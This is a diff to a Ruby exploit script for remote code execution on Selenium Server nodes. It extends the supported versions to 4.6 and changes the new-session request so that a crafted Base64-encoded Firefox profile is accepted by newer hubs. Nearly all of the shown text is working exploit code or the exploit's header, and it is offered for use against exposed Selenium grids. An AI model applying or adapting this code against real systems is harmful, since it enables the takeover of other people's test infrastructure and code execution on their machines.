@@ -4,8 +4,8 @@
 # Exploit Author: Jon Stratton
 # Vendor Homepage: https://www.selenium.dev/
 # Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
-# Version: 3.141.59
-# Tested on: Selenium Server 3.141.59, webdriver, geckodriver 
+# Version: 3.141.59 - 4.6
+# Tested on: Selenium Server 3.141.59 - 4.6, webdriver, geckodriver. Doesnt work as of 4.7 (yet).
 #
 # https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_rce.rb
 #
@@ -51,7 +51,7 @@ stringio.rewind
 encoded_profile = Base64.strict_encode64(stringio.sysread)
 
 # Create session with our new profile
-newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}}
+newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}, :capabilities => {:firstMatch => [{:browserName => "firefox"}]}}
 
 uri = URI.parse(hub_url)
 http = Net::HTTP.new(uri.host, uri.port)
